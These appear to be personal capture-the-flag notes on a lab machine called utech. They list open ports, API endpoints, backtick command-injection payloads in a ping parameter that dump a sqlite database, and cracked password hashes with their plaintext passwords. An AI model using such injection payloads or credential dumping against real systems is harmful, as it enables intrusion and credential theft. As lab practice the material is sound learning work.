# Ports
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp opne  unknown

# robots.txt
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt

## Content of /utech_sitemap.txt
/
/index.html
/what.html
/partners.html

# API on port 8081
/ping?ip=
/auth?login={}&password={}

## ping test
payload = `ls` (with `` to execution in node)
ping: utech.db.sqlite: Name or service not known

payload = `cat utech.db.sqlite`
ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded

## Credentials
r00t f357a0c52799563c7c7b76c1e7543a32   --> n100906
admin 0d0ea5111e3c1def594c1684e3b9be84  --> mrsheafy

## Login page
Restricted area
Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

lp1

# FTP
```bash
cd ..
cd www
cd api
ls
```
    - index.js
    - node_modules
    - package-lock.json
    - package.json
    - start.sh
    - utech.db.sqlite
```bash
get start.sh
```

